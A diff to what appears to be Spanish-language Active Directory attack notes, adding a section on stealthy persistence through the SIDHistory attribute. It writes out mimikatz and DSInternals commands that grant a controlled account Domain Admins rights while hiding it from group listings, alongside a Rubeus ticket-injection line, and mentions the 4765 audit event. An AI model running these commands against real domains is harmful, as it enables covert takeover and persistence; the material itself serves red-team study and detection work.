@@ -102,6 +102,23 @@ Rubeus, desde Windows:
 Rubeus.exe asktgs /ticket:trust.kirbi /service:CIFS/servidor.destino.local /dc:dc.destino.local /ptt
 ```
 
+## 3b. Persistencia por el atributo SIDHistory
+
+Ver [[Persistencia por SID History]]. En vez de inyectar el SID en un ticket, se **escribe el atributo** de una cuenta controlada, que queda como miembro silencioso del grupo. Requiere admin de dominio:
+
+```
+# mimikatz — en el DC, con privilegio
+sid::add /sam:cuentaControlada /new:S-1-5-21-<dominio>-512   # Domain Admins
+
+# DSInternals — offline sobre la base o con privilegio
+Add-ADDBSidHistory -SamAccountName cuentaControlada -SidHistory S-1-5-21-...-512 -DatabasePath ntds.dit
+
+# verificar (y lo que el defensor debería auditar)
+Get-ADUser cuentaControlada -Properties SIDHistory
+```
+
+La cuenta no aparece en `Get-ADGroupMember 'Domain Admins'` pero tiene sus privilegios. Sobrevive a la rotación de contraseñas. La escritura deja el evento `4765` — [[SID History agregado a una cuenta]].
+
 ## 4. Qué se puede inyectar según la frontera
 
 | Frontera | SID History | Resultado |
